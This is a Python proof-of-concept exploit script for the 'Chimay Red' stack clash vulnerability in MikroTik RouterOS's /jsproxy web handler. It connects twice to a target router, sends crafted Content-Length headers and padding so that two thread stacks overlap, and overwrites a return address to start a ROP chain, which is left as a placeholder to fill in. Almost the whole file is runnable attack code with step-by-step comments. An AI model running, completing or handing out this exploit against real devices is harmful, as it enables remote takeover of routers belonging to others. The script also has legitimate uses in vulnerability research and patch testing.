#!/usr/bin/env python3

# Mikrotik Chimay Red Stack Clash POC by BigNerd95

# tested on RouterOS 6.38.4 (x86)

# AST_STACKSIZE = 0x20000 (stack frame size per thread)
# ASLR enabled on libs only
# DEP enabled

import socket, time, sys, struct

def makeHeader(num):
    return b"POST /jsproxy HTTP/1.1\r\nContent-Length: " + bytes(str(num), 'ascii') + b"\r\n\r\n"

def makeSocket(ip, port):
    s = socket.socket()
    try:
        s.connect((ip, port))
    except:
        print("Error connecting to socket")
        sys.exit(-1)
    print("Connected")
    time.sleep(0.5)
    return s

def socketSend(s, data):
    try:
        s.send(data)
    except:
        print("Error sending data")
        sys.exit(-1)
    print("Sent")
    time.sleep(0.5)

def stackClash(ip):
    # 1) Start 2 threads
    # open 2 socket so 2 threads are created
    s1 = makeSocket(ip, 80) # socket 1, thread A
    s2 = makeSocket(ip, 80) # socket 2, thread B

    # 2) Stack Clash
    # 2.1) send post header with Content-Length 0x20900 to socket 1 (thread A)
    socketSend(s1, makeHeader(0x20900)) # thanks to alloca, the Stack Pointer of thread A will point inside the stack frame of thread B (the post_data buffer will start from here)

    # 2.2) send 0x700-0x14 bytes as post data to socket 1 (thread A)
    socketSend(s1, b'A'*(0x700-20)) # increase the post_data buffer pointer of thread A to a position where a return address of thread B will be saved

    # 2.3) send post header with Content-Length 0x200 to socket 2 (thread B)
    socketSend(s2, makeHeader(0x200)) # thanks to alloca, the Stack Pointer of thread B will point where post_data buffer pointer of thread A is positioned

    # 3) Send ROP chain
    # send 4 byte to socket 1 (thread A) to overwrite a return address of a function in thread B
    socketSend(s1, struct.pack('<L', 0x13371337)) # [ROP chain addresses start here]
    # add here your ROP chain addresses
    # socketSend(s1, struct.pack('<L', 0x13371337))
    # ...

    # 4) Start ROP chain
    s2.close() # close socket 2 to return from the function of thread B and start ROP chain

if __name__ == "__main__":
    if len(sys.argv) == 2:
        stackClash(sys.argv[1])
    else:
        print("Usage: ./StackClashPOC.py IP")
